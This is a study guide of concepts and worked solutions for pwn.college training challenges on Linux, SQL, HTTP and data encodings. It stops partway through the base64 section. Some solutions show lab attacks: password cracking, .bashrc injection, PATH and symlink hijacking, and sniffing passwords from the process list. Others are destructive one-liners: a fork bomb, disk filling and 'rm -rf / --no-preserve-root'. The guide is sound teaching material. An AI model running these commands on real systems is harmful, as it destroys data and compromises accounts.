# 🎓 pwn.college Master Playbook

**A complete, step-by-step learning guide with concepts, practice exercises, and solutions for every module**

> **How to use this playbook:** Read the **Concept** section first. Then try the **Practice** exercise yourself. Only open the **Solution** if you get stuck. Every module builds on the previous one.

---

# 📚 Table of Contents

| Module | Topic | Difficulty |
|--------|-------|-----------|
| [Module 1](#-module-1-linux-fundamentals) | Linux Fundamentals (15 sub-modules) | ⭐ Beginner |
| [Module 2](#-module-2-sql-queries) | SQL Queries | ⭐ Beginner |
| [Module 3](#-module-3-talking-web) | Talking Web (HTTP) | ⭐⭐ Intermediate |
| [Module 4](#-module-4-dealing-with-data) | Dealing with Data (Encodings) | ⭐⭐ Intermediate |
| [Module 5](#-module-5-web-security) | Web Security | ⭐⭐⭐ Advanced |
| [Module 6](#-module-6-assembly--systems) | Assembly & Systems | ⭐⭐⭐ Advanced |
| [Module 7](#-module-7-reverse-engineering) | Reverse Engineering | ⭐⭐⭐⭐ Expert |
| [Module 8](#-module-8-intercepting-communication) | Intercepting Communication | ⭐⭐⭐⭐ Expert |

---

# 🐧 Module 1: Linux Fundamentals

> **The Linux Luminarium** — 108 challenges across 15 sub-modules.

## 🎯 Learning Goals
- Navigate the filesystem (absolute vs relative paths)
- Read, create, move, and delete files
- Use pipes, redirection, and globbing
- Manage processes and permissions
- Understand the PATH variable
- Exploit misconfigurations (.bashrc, world-writable directories, symlinks)
- Understand destructive commands (fork bomb, disk exhaustion, `rm -rf /`)

---

## 📖 1.1 Pondering Paths

### Concept: The Filesystem Tree

Linux filesystem starts at `/` (root). Paths can be:

| Path Type | Example | Meaning |
|-----------|---------|---------|
| **Absolute** | `/challenge/run` | Starts from root |
| **Relative** | `./run` | Starts from current directory |
| **Relative (parent)** | `../run` | Goes up one directory first |
| **Home shortcut** | `~/x` | `~` = `/home/hacker` |

**Special directory entries:**

```
.    → This directory
..   → Parent directory
~    → Your home directory
```

### 🏋️ Practice 1: Find the directory

**Task:** `cd` into `/usr/share/zoneinfo/posix/Asia` and run `/challenge/run`

<details>
<summary>💡 Solution</summary>

```bash
cd /usr/share/zoneinfo/posix/Asia
/challenge/run
```
</details>

### 🏋️ Practice 2: Home directory shortcut

**Task:** `/challenge/run` writes the flag to a file, but requires a path that uses `~`.

<details>
<summary>💡 Solution</summary>

```bash
/challenge/run ~/a
```
- `~` expands to `/home/hacker`
- `~/a` = `/home/hacker/a`
</details>

---

## 📖 1.2 Comprehending Commands

### Concept: The Essential Toolkit

| Command | Purpose | Example |
|---------|---------|---------|
| `cat` | Print file contents | `cat /flag` |
| `ls -la` | List all files (incl. hidden) | `ls -la /challenge` |
| `grep` | Search text | `grep pwn.college /file` |
| `find` | Find files | `find / -name flag 2>/dev/null` |
| `touch` | Create empty file | `touch /tmp/x` |
| `rm` | Delete file | `rm file` |
| `mv` | Move/rename | `mv /flag /tmp/` |
| `cp` | Copy | `cp /flag /tmp/` |
| `diff` | Compare files | `diff file1 file2` |
| `ln -s` | Create symlink | `ln -s /flag /tmp/link` |

### 🏋️ Practice 1: Find the needle

**Task:** Grep a large file for the flag.

<details>
<summary>💡 Solution</summary>

```bash
grep pwn.college /challenge/data.txt
```
</details>

### 🏋️ Practice 2: Symlink attack

**Task:** Create a symlink at `/home/hacker/not-the-flag` pointing to `/flag`, then run `/challenge/catflag`.

<details>
<summary>💡 Solution</summary>

```bash
ln -s /flag /home/hacker/not-the-flag
/challenge/catflag
```
</details>

### 🏋️ Practice 3: Find all flags

**Task:** Search the filesystem for flag files.

<details>
<summary>💡 Solution</summary>

```bash
find / -name flag 2>/dev/null
# Then cat each result until you find the real flag
```
</details>

---

## 📖 1.3 File Globbing

### Concept: Wildcards

| Wildcard | Matches | Example |
|----------|---------|---------|
| `*` | Zero or more chars | `file_*` → `file_a`, `file_bb` |
| `?` | Exactly one char | `file_?` → `file_a` |
| `[abc]` | One of these chars | `file_[ab]` → `file_a`, `file_b` |
| `[!abc]` | NOT one of these | `file_[!a]` → `file_b`, `file_c` |

### 🏋️ Practice 1: Bracket globbing

**Task:** Run `/challenge/run file_[bash]` from `/challenge/files`.

<details>
<summary>💡 Solution</summary>

```bash
cd /challenge/files
/challenge/run file_[bash]
```
Matches `file_b`, `file_a`, `file_s`, `file_h`
</details>

### 🏋️ Practice 2: Multiple stars

**Task:** Match all files containing the letter `p`.

<details>
<summary>💡 Solution</summary>

```bash
cd /challenge/files
/challenge/run *p*
```
</details>

### 🏋️ Practice 3: Inverted glob

**Task:** Match all files that do NOT start with `p`, `w`, or `n`.

<details>
<summary>💡 Solution</summary>

```bash
cd /challenge/files
/challenge/run [!pwn]*
```
</details>

---

## 📖 1.4 Practicing Piping

### Concept: Redirection and Pipes

```
command > file     → Write stdout to file (overwrite)
command >> file    → Append stdout to file
command < file     → Read stdin from file
command 2> file    → Write stderr to file
command 2>&1       → Merge stderr into stdout
command1 | command2 → Pipe stdout to command2
```

**File descriptors:**

| FD | Name | Purpose |
|----|------|---------|
| 0 | stdin | Input |
| 1 | stdout | Normal output |
| 2 | stderr | Error output |

### 🏋️ Practice 1: Save and search

**Task:** Save `/challenge/run` output to `/tmp/data.txt` and grep for the flag.

<details>
<summary>💡 Solution</summary>

```bash
/challenge/run > /tmp/data.txt
grep pwn.college /tmp/data.txt
```
</details>

### 🏋️ Practice 2: Grep errors too

**Task:** Filter stderr for the flag.

<details>
<summary>💡 Solution</summary>

```bash
/challenge/run 2>&1 | grep pwn.college
```
- `2>&1` sends stderr (2) to stdout (1)
- `|` pipes to grep
</details>

### 🏋️ Practice 3: Sed substitution

**Task:** Remove `FAKEFLAG` from the output.

<details>
<summary>💡 Solution</summary>

```bash
/challenge/run | sed 's/FAKEFLAG//g'
```
- `s/old/new/g` replaces all occurrences
</details>

### 🏋️ Practice 4: Tee to a file

**Task:** Capture the stream in a file while piping it onward.

<details>
<summary>💡 Solution</summary>

```bash
/challenge/pwn | tee intercepted_data | /challenge/college
cat intercepted_data
```
</details>

### 🏋️ Practice 5: Process substitution

**Task:** Diff two command outputs without creating files.

<details>
<summary>💡 Solution</summary>

```bash
diff <(/challenge/print_decoys) <(/challenge/print_decoys_and_flag)
```
- `<(...)` creates a temp file from command output
</details>

### 🏋️ Practice 6: FIFO (Named Pipe)

**Task:** Create a FIFO and get the flag.

<details>
<summary>💡 Solution</summary>

```bash
mkfifo /tmp/flag_fifo
/challenge/run > /tmp/flag_fifo &
cat /tmp/flag_fifo
```
- `/challenge/run` blocks writing to the FIFO until `cat` reads it
</details>

---

## 📖 1.5 Shell Variables

### Concept: Variables and Export

```
VAR=value           → Set shell variable (local)
export VAR=value    → Set environment variable (global)
echo $VAR           → Read variable
env                 → List environment variables
$(command)          → Command substitution
read VAR < file     → Read file into variable
```

**Key difference:**
- **Local variable**: Only the current shell sees it.
- **Exported variable**: Child processes inherit it.

### 🏋️ Practice 1: Command substitution

**Task:** Capture `/challenge/run` output in a variable.

<details>
<summary>💡 Solution</summary>

```bash
PWN=$(/challenge/run)
echo $PWN
```
</details>

### 🏋️ Practice 2: Export vs Local

**Task:** Export `PWN=COLLEGE` and set `COLLEGE=PWN` (local).

<details>
<summary>💡 Solution</summary>

```bash
export PWN=COLLEGE
COLLEGE=PWN
/challenge/run
```
The challenge sees `PWN` (exported) but not `COLLEGE` (local).
</details>

---

## 📖 1.6 Data Manipulation

### Concept: Text Processing

| Command | Purpose | Example |
|---------|---------|---------|
| `tr` | Translate/delete chars | `tr 'a-z' 'A-Z'` |
| `head` | First N lines | `head -n 7` |
| `tail` | Last N lines | `tail -n 5` |
| `cut` | Extract columns | `cut -d ' ' -f 2` |
| `sort` | Sort lines | `sort file` |
| `wc` | Count lines/words | `wc -l` |

### 🏋️ Practice 1: Case flip

**Task:** Reverse the case of every letter.

<details>
<summary>💡 Solution</summary>

```bash
/challenge/run | tr 'A-Za-z' 'a-zA-Z'
```
</details>

### 🏋️ Practice 2: Remove newlines

**Task:** Stitch flag across multiple lines.

<details>
<summary>💡 Solution</summary>

```bash
/challenge/run | tr -d '\n'
```
</details>

### 🏋️ Practice 3: Extract column

**Task:** Pull flag chars from column 2.

<details>
<summary>💡 Solution</summary>

```bash
/challenge/run | cut -d " " -f 2 | tr -d "\n"
```
</details>

---

## 📖 1.7 Processes and Jobs

### Concept: Process Control

| Command | Purpose |
|---------|---------|
| `ps -ef` | List all processes (full format) |
| `ps aux` | List all processes (BSD format) |
| `kill PID` | Terminate process |
| `Ctrl+Z` | Suspend (stop) process |
| `fg` | Resume in foreground |
| `bg` | Resume in background |
| `command &` | Run in background |

### 🏋️ Practice 1: Find renamed binary

**Task:** A program was renamed and is running. Find it.

<details>
<summary>💡 Solution</summary>

```bash
ps -ef | grep challenge
# Find the path, then run it
```
</details>

### 🏋️ Practice 2: Kill the blocker

**Task:** Kill `/challenge/dont_run` so `/challenge/run` works.

<details>
<summary>💡 Solution</summary>

```bash
ps -ef | grep dont_run
kill <PID>
```
</details>

### 🏋️ Practice 3: Background process

**Task:** Run a command in the background.

<details>
<summary>💡 Solution</summary>

```bash
/challenge/run &
```
</details>

---

## 📖 1.8 Untangling Users

### Concept: User Switching

```bash
su user          → Switch to user
sudo command     → Run command as root
```

**Password cracking:**

```bash
john /challenge/shadow-leak
```

Reveals passwords for system users.

### 🏋️ Practice 1: Crack the password

**Task:** Crack the shadow file and `su` to `zardus`.

<details>
<summary>💡 Solution</summary>

```bash
john /challenge/shadow-leak
# Output: aardvark
su zardus
# Enter password: aardvark
```
</details>

---

## 📖 1.9 Perceiving Permissions

### Concept: Linux Permissions

```
-rwxr-xr-x
 │└┬┘└┬┘└┬┘
 │ │  │  └── Others (r-x = read + execute)
 │ │  └───── Group  (r-x = read + execute)
 │ └──────── Owner  (rwx = read + write + execute)
 └────────── File type (- = file, d = directory)
```

**Numeric permissions:**

| Number | Symbolic | Meaning |
|--------|----------|---------|
| 0 | `---` | No access |
| 1 | `--x` | Execute |
| 2 | `-w-` | Write |
| 3 | `-wx` | Write + execute |
| 4 | `r--` | Read |
| 5 | `r-x` | Read + execute |
| 6 | `rw-` | Read + write |
| 7 | `rwx` | Full access |

### 🏋️ Practice 1: Change owner

**Task:** Take ownership of `/flag` and read it.

<details>
<summary>💡 Solution</summary>

```bash
chown hacker /flag
cat /flag
```
</details>

### 🏋️ Practice 2: Change permissions

**Task:** Make `/flag` readable by all.

<details>
<summary>💡 Solution</summary>

```bash
chmod a+r /flag
cat /flag
```
</details>

### 🏋️ Practice 3: SUID bit

**Task:** Make `/challenge/getroot` run as root.

<details>
<summary>💡 Solution</summary>

```bash
chmod u+s /challenge/getroot
/challenge/getroot
cat /flag
```
The `s` in `-rwsr-xr-x` means "run as file owner."
</details>

---

## 📖 1.10 Chaining Commands

### Concept: Command Operators

| Operator | Meaning | Example |
|----------|---------|---------|
| `;` | Sequential (always run both) | `cmd1; cmd2` |
| `&&` | AND (run cmd2 only if cmd1 succeeds) | `cmd1 && cmd2` |
| `\|\|` | OR (run cmd2 only if cmd1 fails) | `cmd1 \|\| cmd2` |

### 🏋️ Practice 1: Logical AND

**Task:** Run `/challenge/second` only if `/challenge/first-success` succeeds.

<details>
<summary>💡 Solution</summary>

```bash
/challenge/first-success && /challenge/second
```
</details>

### 🏋️ Practice 2: Shell script with shebang

**Task:** Create `solve.sh` with shebang that prints "hack the planet".

<details>
<summary>💡 Solution</summary>

```bash
cat > solve.sh << 'EOF'
#!/bin/bash
echo "hack the planet"
EOF
chmod a+x solve.sh
./solve.sh
```
</details>

### 🏋️ Practice 3: Script with arguments

**Task:** Print second argument then first argument.

<details>
<summary>💡 Solution</summary>

```bash
cat > solve.sh << 'EOF'
#!/bin/bash
echo "$2 $1"
EOF
chmod a+x solve.sh
./solve.sh apple banana
# Output: banana apple
```
</details>

### 🏋️ Practice 4: Conditional script

**Task:** Print "college" if `$1` is "pwn".

<details>
<summary>💡 Solution</summary>

```bash
cat > solve.sh << 'EOF'
#!/bin/bash
if [ "$1" == "pwn" ]
then
  echo "college"
fi
EOF
chmod a+x solve.sh
./solve.sh pwn
```
</details>

---

## 📖 1.11 Terminal Multiplexing (screen / tmux)

### Concept: Persistent Sessions

Terminal multiplexers let you:
- Run multiple shells in one window
- **Detach** from a session and **reattach** later (survives SSH disconnects)

| Action | `screen` | `tmux` |
|--------|----------|--------|
| Start | `screen` | `tmux` |
| Detach | `Ctrl-a` then `d` | `Ctrl-b` then `d` |
| List sessions | `screen -ls` | `tmux ls` |
| Reattach | `screen -r` | `tmux attach` (or `tmux a`) |
| New window | `Ctrl-a c` | `Ctrl-b c` |
| Next window | `Ctrl-a n` | `Ctrl-b n` |
| Previous window | `Ctrl-a p` | `Ctrl-b p` |
| Jump to window N | `Ctrl-a N` | `Ctrl-b N` |
| Window picker | `Ctrl-a "` | `Ctrl-b w` |

### 🏋️ Practice 1: Detach and reattach

**Task:** Start `screen`, detach, run `/challenge/run`, then reattach to claim the flag.

<details>
<summary>💡 Solution</summary>

```bash
screen
# Press Ctrl-a, then d
/challenge/run
screen -r
```
</details>

### 🏋️ Practice 2: Find the right session

**Task:** List sessions, attach to each until you find the flag.

<details>
<summary>💡 Solution</summary>

```bash
screen -ls
screen -r <session_name>
# If no flag, Ctrl-a d and try the next session
```
</details>

### 🏋️ Practice 3: Switch windows (tmux)

**Task:** The flag is in Window 0. Switch to it.

<details>
<summary>💡 Solution</summary>

```bash
tmux a
# Press Ctrl-b, then 0
```
</details>

---

## 📖 1.12 Pondering PATH

### Concept: The PATH Variable

`PATH` is a colon-separated list of directories where the shell searches for commands.

```
PATH=/usr/bin:/bin:/usr/local/bin
```

When you type `ls`, the shell searches each directory in order.

**PATH Hijacking**: If you can place a fake command earlier in `PATH`, the shell runs your version instead of the real one.

### 🏋️ Practice 1: Empty PATH

**Task:** Prevent `/challenge/run` from calling `rm`.

<details>
<summary>💡 Solution</summary>

```bash
PATH=""
/challenge/run
```
The shell can't find `rm`, so it fails and gives you the flag.
</details>

### 🏋️ Practice 2: Set PATH to a directory

**Task:** Point PATH to `/challenge/more_commands` so `win` is found.

<details>
<summary>💡 Solution</summary>

```bash
PATH=/challenge/more_commands/
/challenge/run
```
</details>

### 🏋️ Practice 3: Hijack a command

**Task:** Create a fake `rm` that prints the flag instead.

<details>
<summary>💡 Solution</summary>

```bash
echo "/bin/cat /flag" > /home/hacker/rm
chmod +x /home/hacker/rm
PATH=/home/hacker
/challenge/run
```
</details>

---

## 📖 1.13 Shenanigans (Persistence & Sniffing Attacks)

> These challenges exploit misconfigured permissions and process visibility to steal information.

### 1.13.1 `.bashrc` Hijacking

**Concept:** `.bashrc` runs automatically when a user opens a shell. If writable, you can inject commands that run as the victim.

#### 🏋️ Practice: Inject into `.bashrc`

**Task:** Make `zardus` print the flag.

<details>
<summary>💡 Solution</summary>

```bash
echo "cat /flag" >> /home/zardus/.bashrc
/challenge/victim
```
</details>

### 1.13.2 Sniffing Inputs

**Concept:** Zardus runs a command (`flag_checker`) and types the flag into it. You can hijack the command name so your fake version receives the input.

#### 🏋️ Practice: Hijack `flag_checker`

**Task:** Create a fake `flag_checker` that captures what Zardus types.

<details>
<summary>💡 Solution</summary>

```bash
# Step 1: Create fake checker
cat > /home/hacker/flag_checker << 'EOF'
#!/bin/bash
echo "Type the flag"
read FLAG
echo "You entered: $FLAG"
EOF
chmod +x /home/hacker/flag_checker

# Step 2: Hijack PATH in Zardus's bashrc
echo 'export PATH=/home/hacker:$PATH' >> /home/zardus/.bashrc

# Step 3: Trigger victim
/challenge/victim
```
</details>

### 1.13.3 Overshared Directories

**Concept:** A world-writable directory lets you **delete and replace** files you don't own. You can replace the victim's `.bashrc` with your own malicious version.

#### 🏋️ Practice: Replace `.bashrc`

**Task:** Replace `/home/zardus/.bashrc` with a malicious one.

<details>
<summary>💡 Solution</summary>

```bash
# Create malicious bashrc locally
cat > /home/hacker/.bashrc << 'EOF'
echo "Type the flag"
read FLAG
echo "Captured: $FLAG"
EOF

# Replace Zardus's bashrc
rm /home/zardus/.bashrc
cp /home/hacker/.bashrc /home/zardus/.bashrc

# Trigger victim
/challenge/victim
```
</details>

### 1.13.4 Tricky Linking (Symlink Attack)

**Concept:** If you can write to a directory, you can delete a file and replace it with a **symlink** to a sensitive file. When the victim writes to the symlink, the kernel writes to the target using the victim's privileges.

#### 🏋️ Practice: Symlink attack

**Task:** Replace a file the victim writes to with a symlink to Zardus's `.bashrc`.

<details>
<summary>💡 Solution</summary>

```bash
# Replace the file with a symlink
rm /tmp/collab/evil-commands.txt
ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt

# First run: injects "cat /flag" into Zardus's bashrc
/challenge/victim

# Second run: executes the injected command
/challenge/victim
```
</details>

### 1.13.5 Sniffing Process Arguments

**Concept:** Linux process lists are public. If a user runs a command with a password as an argument, anyone can see it with `ps aux`.

#### 🏋️ Practice: Catch the password

**Task:** Monitor `ps aux` to catch Zardus's password, then `su` to him.

<details>
<summary>💡 Solution</summary>

```bash
# Monitor processes in a loop
while true; do ps aux | grep zardus | grep -v grep; sleep 0.1; done

# When you see the password in the output, use it
su zardus
sudo cat /flag
```
</details>

### 1.13.6 Snooping on Configurations

**Concept:** Many config files are world-readable (`-rw-r--r--`). Secrets like API keys are often stored in `.bashrc` or `.profile`.

#### 🏋️ Practice: Steal the API key

**Task:** Read Zardus's `.bashrc` to find `FLAG_GETTER_API_KEY`, then use it.

<details>
<summary>💡 Solution</summary>

```bash
cat /home/zardus/.bashrc
# Look for: FLAG_GETTER_API_KEY=sk-...

flag_getter --key sk-1965714851
```
</details>

---

## 📖 1.14 Daring Destruction

> **Warning:** These commands can destroy your environment. They are recoverable on pwn.college by restarting the container.

### 1.14.1 The Fork Bomb

**Concept:** A fork bomb creates processes faster than the kernel can handle, filling the process table and freezing the system.

**Key ingredients:**
- `fork()` (implicit in launching a process)
- Backgrounding (`&`) to avoid waiting for children
- Self-reference (script calls itself)

#### 🏋️ Practice: Fork bomb

**Task:** Create a fork bomb script and detonate it.

<details>
<summary>💡 Solution</summary>

```bash
# Step 1: Start the checker in a separate terminal
/challenge/check

# Step 2: Create the bomb script
cat > bomb.sh << 'EOF'
#!/bin/bash
./bomb.sh & ./bomb.sh &
EOF
chmod +x bomb.sh

# Step 3: Detonate
./bomb.sh
```
The checker gives you the flag when it can't spawn new processes.
</details>

### 1.14.2 Disk-Space Doomsday

**Concept:** Fill the 1 GB home directory quota so no new files can be created.

**The `yes` command:** Outputs `y` forever. Redirect it to a file to fill the disk.

#### 🏋️ Practice: Fill the disk

**Task:** Fill the disk, run the checker, then clean up and run it again.

<details>
<summary>💡 Solution</summary>

```bash
# Stage 1: Fill the disk
yes > big_junk_file
# Wait until you see: "No space left on device"

# Run first check
/challenge/check

# Stage 2: Clean up
rm big_junk_file

# Run second check for the flag
/challenge/check
```
</details>

### 1.14.3 `rm -rf /` (The Nuclear Option)

**Concept:** Deletes everything on the filesystem. Requires `--no-preserve-root` on modern systems.

**Life after `rm -rf /`:** Bash is already loaded in RAM, so **built-in commands** (`read`, `echo`) still work, even though external programs (`cat`, `ls`) are gone.

#### 🏋️ Practice: Survive `rm -rf /`

**Task:** Delete everything, then read `/flag` using only shell built-ins.

<details>
<summary>💡 Solution</summary>

```bash
# In one terminal, start the checker
/challenge/check

# In another terminal, wipe the system
rm -rf / --no-preserve-root

# Use built-in `read` instead of `cat`
read -r FLAG < /flag
echo $FLAG
```
</details>

---

# 🗄️ Module 2: SQL Queries

## 🎯 Learning Goals
- Write SELECT statements
- Filter with WHERE
- Use SUBSTR, LENGTH, LIMIT
- Query `sqlite_master`

---

## 📖 2.1 Basic SELECT

```sql
SELECT column FROM table;
SELECT * FROM table;                    -- all columns
SELECT col1, col2 FROM table;           -- specific columns
```

### 🏋️ Practice 1: Read the flag

**Task:** The flag is stored in the `assets` table.

<details>
<summary>💡 Solution</summary>

```sql
SELECT * FROM assets;
```
</details>

---

## 📖 2.2 WHERE Clause

| Operator | Meaning |
|----------|---------|
| `=` | Equal |
| `!=` | Not equal |
| `>` `<` `>=` `<=` | Comparisons |
| `LIKE` | Pattern match (`%` wildcard) |
| `AND` `OR` | Combine conditions |

### 🏋️ Practice 1: Find the flag by tag

**Task:** The flag is in `details` where `flag_tag = 1337`.

<details>
<summary>💡 Solution</summary>

```sql
SELECT secret FROM details WHERE flag_tag = 1337;
```
</details>

### 🏋️ Practice 2: Exclusionary filter

**Task:** Get the flag where `flag_tag != 1`.

<details>
<summary>💡 Solution</summary>

```sql
SELECT flag FROM flags WHERE flag_tag != 1;
```
</details>

### 🏋️ Practice 3: Filter strings

**Task:** Get the secret where `flag_tag = 'yep'`.

<details>
<summary>💡 Solution</summary>

```sql
SELECT secret FROM data WHERE flag_tag = 'yep';
```
</details>

---

## 📖 2.3 Functions: SUBSTR, LENGTH, LIMIT

```sql
SUBSTR(string, start, length)    -- Extract substring (1-indexed)
LENGTH(string)                    -- String length
LIMIT n                           -- Only n rows
```

### 🏋️ Practice 1: Extract first character

**Task:** Get the first char of `record` where it starts with `p`.

<details>
<summary>💡 Solution</summary>

```sql
SELECT SUBSTR(record, 1, 1) FROM fragments WHERE SUBSTR(record, 1, 1) = 'p';
```
</details>

### 🏋️ Practice 2: Extract in chunks

**Task:** Extract the flag from `archive` in 4-byte chunks.

<details>
<summary>💡 Solution</summary>

```sql
SELECT SUBSTR(value, 1, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 5, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 9, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
-- ... continue until you get the full flag
```
</details>

---

## 📖 2.4 Querying Metadata

SQLite stores table info in `sqlite_master`:

```sql
SELECT tbl_name FROM sqlite_master WHERE type='table';
SELECT sql FROM sqlite_master WHERE type='table' AND name='users';
```

### 🏋️ Practice 1: Find hidden table

<details>
<summary>💡 Solution</summary>

```sql
-- Step 1: Find tables
SELECT tbl_name FROM sqlite_master;

-- Step 2: Query the discovered table
SELECT detail FROM usMSjFGn;   -- use actual name from step 1
```
</details>

---

# 🌐 Module 3: Talking Web (HTTP)

## 🎯 Learning Goals
- Understand HTTP requests/responses
- Use curl, netcat, python requests
- Manipulate headers (User-Agent, Host, Cookie)
- Handle redirects, forms, cookies
- Write JavaScript for browser-based challenges

---

## 📖 3.1 HTTP Basics

An HTTP request:

```
GET /path HTTP/1.1
Host: challenge.localhost:80
User-Agent: Firefox
Cookie: session=abc

(blank line)
body (for POST)
```

An HTTP response:

```
HTTP/1.1 200 OK
Server: Werkzeug
Content-Type: text/html
Content-Length: 123

(blank line)
<html>...</html>
```

### 🏋️ Practice 1: Set User-Agent

**Task:** Request the flag with `User-Agent: Firefox`.

<details>
<summary>💡 Solution</summary>

```bash
curl --user-agent "Firefox" http://challenge.localhost:80/pwn
```
</details>

### 🏋️ Practice 2: Use netcat

**Task:** Send a raw HTTP request with netcat.

<details>
<summary>💡 Solution</summary>

```bash
echo -ne "GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc challenge.localhost 80
```
</details>

### 🏋️ Practice 3: Use Python requests

<details>
<summary>💡 Solution</summary>

```python
import requests
r = requests.get('http://challenge.localhost:80/trial')
print(r.text)
```
</details>

---

## 📖 3.2 HTTP Headers

| Header | Purpose |
|--------|---------|
| `User-Agent` | Browser/client identity |
| `Host` | Virtual host |
| `Cookie` | Session data |
| `Content-Type` | Body format |
| `Content-Length` | Body length |
| `Referer` | Previous page |

### 🏋️ Practice 1: Set Host header

<details>
<summary>💡 Solution</summary>

```bash
curl --header "Host: challenge.localhost" http://challenge.localhost
```
</details>

---

## 📖 3.3 URL Encoding

| Char | Encoding |
|------|----------|
| space | `%20` |
| `/` | `%2F` |
| `?` | `%3F` |
| `&` | `%26` |
| `=` | `%3D` |

### 🏋️ Practice 1: Encode spaces

**Task:** Request `/hack the planet`.

<details>
<summary>💡 Solution</summary>

```bash
echo -ne "GET /hack%20the%20planet HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc challenge.localhost 80
```
</details>

---

## 📖 3.4 GET Parameters

```
http://host/path?key1=value1&key2=value2
```

### 🏋️ Practice 1: Basic parameters

<details>
<summary>💡 Solution</summary>

```bash
curl "http://challenge.localhost:80/endpoint?key=value"
```
</details>

### 🏋️ Practice 2: Multiple parameters

<details>
<summary>💡 Solution</summary>

```bash
curl "http://challenge.localhost:80/path?param1=value1&param2=value2"
```
</details>

---

## 📖 3.5 HTTP Forms (POST)

```
POST /endpoint HTTP/1.1
Host: challenge.localhost:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

parameter=value
```

### 🏋️ Practice 1: POST with curl

<details>
<summary>💡 Solution</summary>

```bash
curl -X POST -d "parameter=value" http://challenge.localhost:80/endpoint
```
</details>

### 🏋️ Practice 2: POST with netcat

<details>
<summary>💡 Solution</summary>

```bash
echo -ne "POST /endpoint HTTP/1.1\r\nHost: challenge.localhost:80\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\n\r\nparameter=value" | nc challenge.localhost 80
```
**Key:** must include `Content-Length` and `Content-Type`.
</details>

### 🏋️ Practice 3: POST with Python

<details>
<summary>💡 Solution</summary>

```python
import requests
data = {'parameter': 'value'}
r = requests.post('http://challenge.localhost:80/endpoint', data=data)
print(r.text)
```
</details>

---

## 📖 3.6 HTTP Redirects

A redirect returns:

```
HTTP/1.1 302 FOUND
Location: /new-path
```

### 🏋️ Practice 1: Follow redirect with curl

<details>
<summary>💡 Solution</summary>

```bash
curl -L http://challenge.localhost:80
```
- `-L` = follow redirects
</details>

### 🏋️ Practice 2: Follow redirect manually

<details>
<summary>💡 Solution</summary>

```bash
# Step 1: Find the Location header
curl -v http://challenge.localhost:80

# Step 2: Request the new location
curl http://challenge.localhost:80/wbcYrxAh-fulfill
```
</details>

---

## 📖 3.7 HTTP Cookies

Server sets cookie:

```
Set-Cookie: session=abc123; Path=/
```

Client sends cookie:

```
Cookie: session=abc123
```

### 🏋️ Practice 1: Capture and use a cookie

<details>
<summary>💡 Solution</summary>

```bash
# Step 1: Get the cookie
curl http://localhost:80 -v

# Step 2: Use the cookie
curl --cookie "cookie_name=cookie_value" http://localhost:80
```
</details>

### 🏋️ Practice 2: Use netcat

<details>
<summary>💡 Solution</summary>

```bash
# Step 1: Get cookie
echo -ne 'GET / HTTP/1.1\r\nHost: localhost:80\r\n\r\n' | nc 127.0.0.1 80

# Step 2: Send cookie
echo -ne "GET / HTTP/1.1\r\nHost: localhost:80\r\nCookie: cookie_name=cookie_value\r\n\r\n" | nc 127.0.0.1 80
```
</details>

---

## 📖 3.8 JavaScript (Browser Context)

When the challenge asks for `.html` files, you write JavaScript.

### 🏋️ Practice 1: Redirect

**Task:** Create `solve.html` that redirects to `/fulfill`.

<details>
<summary>💡 Solution</summary>

```html
<html>
<body>
<script>
window.location.href='http://challenge.localhost:80/fulfill';
</script>
</body>
</html>
```
Save to `/home/hacker/public_html/solve.html`
</details>

### 🏋️ Practice 2: Fetch and redirect

<details>
<summary>💡 Solution</summary>

```html
<html>
<body>
<script>
fetch('http://challenge.localhost:80/submit')
  .then(r => r.text())
  .then(content => window.location.href='/home/hacker/public_html/solve.html'+content);
</script>
</body>
</html>
```
</details>

### 🏋️ Practice 3: POST with fetch

<details>
<summary>💡 Solution</summary>

```html
<script>
fetch('http://challenge.localhost:80/hack', {
  method: 'POST',
  body: new URLSearchParams({pin: 'pzzodcbb', code: 'ohrcrevd'})
})
.then(r => r.text())
.then(content => window.location.href='/home/hacker/public_html/solve.html'+content);
</script>
```
</details>

---

# 🔢 Module 4: Dealing with Data (Encodings)

## 🎯 Learning Goals
- Read Python programs that check input
- Understand hex, binary, base64
- Handle nested encodings
- Work with UTF-8 / UTF-16

---

## 📖 4.1 Reading the Program

Most challenges give you a Python program that checks your input. Read it:

```python
correct_password = b"secret"
if entered_password == correct_password:
    print("Flag!")
```

### 🏋️ Practice 1: Find the password

<details>
<summary>💡 Solution</summary>

```bash
cat /challenge/runme
# Find the correct_password value
echo -n "the_password" | /challenge/runme
```
- `echo -n` prevents appending a newline (`\n`) which would break the comparison.
</details>

---

## 📖 4.2 Hex Encoding

Hex bytes are written as `\xNN`:
- `\x41` = `A`
- `\x0a` = newline

Python:
```python
bytes.fromhex("414243")   # b'ABC'
b'ABC'.hex()               # '414243'
```

### 🏋️ Practice 1: Hex input

**Task:** Program expects `bytes.fromhex()` of your input to equal `b'\x98\xd3...'`.

<details>
<summary>💡 Solution</summary>

```bash
echo -n "98d3d0b2cee1eeab" | /challenge/runme
```
</details>

### 🏋️ Practice 2: Encoding with `\x`

**Task:** Input needs to be raw bytes `\x83\x32...`.

<details>
<summary>💡 Solution</summary>

```bash
echo -e -n "\x832\xdb\xc4\xc5\xd0\xaa\x8a" | /challenge/runme
```
- `-e` interprets `\xNN` as single bytes
</details>

### 🏋️ Practice 3: ASCII to hex

**Task:** Convert string `eewqcnzx` to hex.

<details>
<summary>💡 Solution</summary>

```bash
gdb -q
(gdb) p/x "eewqcnzx"
$1 = {0x65, 0x65, 0x77, 0x71, 0x63, 0x6e, 0x7a, 0x78, 0x0}

# Use hex
echo -n "65657771636e7a78" | /challenge/runme
```
</details>

---

## 📖 4.3 Base64 Encoding

```python
import base64
base64.b64encode(b"data")   # b'ZGF0YQ=='
base64.b64decode("ZGF0YQ==")  # b'data'
```

### 🏋️ Practice 1: Decode base64

<details>
<summary>💡 Solution</summary>

```bash
echo -n "ZGF0YQ==" | /challenge/runme
```
</details>

### 🏋️ Practice 2: Encode base64

**Task:** You need to supply `base64.b64encode(b'\x832\xdb...')`.

<details>
<summary>💡 Solution</summary>

```bash
# Encode
